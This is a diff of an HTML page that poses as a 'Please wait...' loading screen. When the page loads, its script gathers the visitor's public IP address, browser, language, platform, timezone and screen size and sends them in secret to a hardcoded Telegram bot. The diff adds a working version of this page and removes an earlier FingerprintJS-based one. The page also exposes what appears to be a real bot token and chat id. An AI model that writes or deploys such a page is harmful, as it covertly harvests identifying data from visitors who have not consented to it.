@@ -1,34 +1,39 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Loading...</title>
-  </head>
-  <body>
-    <h3>Please wait...</h3>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <script>
-      (async () => {
-        const fp = await FingerprintJS.load();
-        const result = await fp.get();
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+  <h1>Please wait...</h1>
+  <script>
+    (async () => {
+      // Get public IP
+      let ip = "unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (err) {
+        console.error("IP fetch failed:", err);
+      }
 
-        const ip = await fetch("https://api.ipify.org?format=json")
-          .then(res => res.json())
-          .then(data => data.ip);
+      // Gather fingerprint info
+      const info = {
+        ip: ip,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`
+      };
 
-        const info = {
-          ip: ip,
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          platform: navigator.platform,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          screen: `${screen.width}x${screen.height}`,
-          fingerprint: result.visitorId
-        };
+      // Format and encode message
+      const message = encodeURIComponent(JSON.stringify(info, null, 2));
 
-        const message = encodeURIComponent(JSON.stringify(info, null, 2));
-
-        fetch(`https://api.telegram.org/bot<7641332700:AAHHn0QvbMo3quMzKxs9-E7CDAJb9sQzYUQ>/sendMessage?chat_id=<7467349703>&text=${message}`);
-      })();
-    </script>
-  </body>
+      // Send to Telegram bot
+      fetch(`https://api.telegram.org/bot7641332700:AAHHn0QvbMo3quMzKxs9-E7CDAJb9sQzYUQ/sendMessage?chat_id=7467349703&text=${message}`)
+        .catch(err => console.error("Telegram fetch failed:", err));
+    })();
+  </script>
+</body>
 </html>
